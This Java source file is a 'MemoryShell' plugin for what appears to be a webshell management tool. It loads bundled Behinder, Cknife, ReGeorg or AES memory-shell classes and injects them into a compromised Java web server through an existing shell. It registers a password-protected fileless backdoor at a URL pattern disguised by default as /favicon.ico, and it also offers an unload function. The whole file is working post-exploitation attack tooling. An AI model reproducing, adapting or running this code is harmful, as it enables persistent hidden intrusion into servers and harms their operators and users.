package vip.youwe.shell.shells.plugins.java;

import vip.youwe.shell.core.Encoding;
import vip.youwe.shell.core.annotation.PluginnAnnotation;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.core.imp.Plugin;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.core.ui.ShellManage;
import vip.youwe.shell.core.ui.component.GBC;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import java.lang.reflect.Method;

@PluginnAnnotation(payloadName = "JavaDynamicPayload", Name = "MemoryShell")
public class MemoryShell implements Plugin {

    private static final String[] MEMORYSHELS = {"AES_BASE64", "AES_RAW", "Behinder", "Cknife", "ReGeorg"};

    private ShellEntity shellEntity;
    private Payload payload;

    private JPanel panel = new JPanel(new GridBagLayout());
    private JLabel urlLabel;
    private JLabel passwordLabel;
    private JLabel payloadLabel;
    private JLabel secretKeyLabel;
    private JTextField urlTextField;
    private JTextField passwordTextField;
    private JComboBox<String> payloadComboBox;
    private JTextField secretKeyTextField;
    private JButton runButton;
    private JButton unLoadMemoryShellButton;
    private Encoding encoding;

    public MemoryShell() {
        GBC gbcLUrl = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
        GBC gbcUrl = (new GBC(1, 0, 3, 1)).setInsets(5, 20, 0, 0);
        GBC gbcLPassword = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
        GBC gbcPassword = (new GBC(1, 1, 3, 1)).setInsets(5, 20, 0, 0);
        GBC gbcLSecretKey = (new GBC(0, 2)).setInsets(5, -40, 0, 0);
        GBC gbcSecretKey = (new GBC(1, 2, 3, 1)).setInsets(5, 20, 0, 0);
        GBC gbcLPayload = (new GBC(0, 3)).setInsets(5, -40, 0, 0);
        GBC gbcPayload = (new GBC(1, 3, 3, 1)).setInsets(5, 20, 0, 0);
        GBC gbcGenerate = (new GBC(2, 4)).setInsets(5, -40, 0, 0);
        GBC gbcunLoadMemoryShell = (new GBC(1, 4, 3, 1)).setInsets(5, 20, 0, 0);

        this.urlLabel = new JLabel("URL路径");
        this.passwordLabel = new JLabel("密码");
        this.secretKeyLabel = new JLabel("密钥");
        this.payloadLabel = new JLabel("有效载荷");
        this.urlTextField = new JTextField(16);
        this.passwordTextField = new JTextField(16);
        this.secretKeyTextField = new JTextField(16);
        this.payloadComboBox = new JComboBox(MEMORYSHELS);
        this.runButton = new JButton("run");
        this.unLoadMemoryShellButton = new JButton("卸载");

        this.panel.add(this.urlLabel, gbcLUrl);
        this.panel.add(this.urlTextField, gbcUrl);
        this.panel.add(this.passwordLabel, gbcLPassword);
        this.panel.add(this.passwordTextField, gbcPassword);
        this.panel.add(this.secretKeyLabel, gbcLSecretKey);
        this.panel.add(this.secretKeyTextField, gbcSecretKey);
        this.panel.add(this.payloadLabel, gbcLPayload);
        this.panel.add(this.payloadComboBox, gbcPayload);
        this.panel.add(this.runButton, gbcGenerate);
        this.panel.add(this.unLoadMemoryShellButton, gbcunLoadMemoryShell);

        this.urlTextField.setText("/favicon.ico");
        this.passwordTextField.setText("password");
        this.secretKeyTextField.setText("key");
    }

    private void runButtonClick(ActionEvent actionEvent) {
        try {
            String secretKey = functions.md5(this.secretKeyTextField.getText()).substring(0, 16);
            String pattern = this.urlTextField.getText();
            String password = this.passwordTextField.getText();
            if (secretKey.length() > 0 && pattern.length() > 0 && password.length() > 0) {
                String shellName = (String) this.payloadComboBox.getSelectedItem();
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("pwd", password);
                reqParameter.add("secretKey", secretKey);
                reqParameter.add("path", pattern);
                String className = String.format("x.%s", shellName);
                InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.classs", shellName));
                byte[] classByteArray = functions.readInputStream(inputStream);
                inputStream.close();
                boolean loaderState = this.payload.include(className, classByteArray);
                if (loaderState) {
                    byte[] result = this.payload.evalFunc(className, "run", reqParameter);
                    String resultString = this.encoding.Decoding(result);
                    Log.log(resultString);
                    JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
                } else {
                    JOptionPane.showMessageDialog(this.panel, "loader fail!", "提示", 2);
                }
            } else {
                JOptionPane.showMessageDialog(this.panel, "password or secretKey or urlPattern is Null", "提示", 2);
            }
        } catch (Exception e) {
            Log.error(e);
            JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
        }
    }

    private void unLoadMemoryShellButtonClick(ActionEvent actionEvent) {
        String urlPattern = JOptionPane.showInputDialog("urlPattern");
        if (urlPattern != null && urlPattern.length() > 0) {
            Plugin servletManagePlugin = ((ShellManage) this.shellEntity.getFrame()).getPlugin("ServletManage");
            if (servletManagePlugin != null) {
                try {
                    Method unLoadServletMethod = servletManagePlugin.getClass().getDeclaredMethod("unLoadServlet", new Class[]{String.class, String.class});
                    unLoadServletMethod.setAccessible(true);
                    String resultString = (String) unLoadServletMethod.invoke(servletManagePlugin, new Object[]{urlPattern, urlPattern});
                    Log.log(resultString);
                    JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
                } catch (Exception e) {
                    Log.error(e);
                    JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
                }
            } else {
                JOptionPane.showMessageDialog(this.panel, "not find Plugin ServletManage", "提示", 2);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "not input urlPattern", "提示", 2);
        }
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }

}
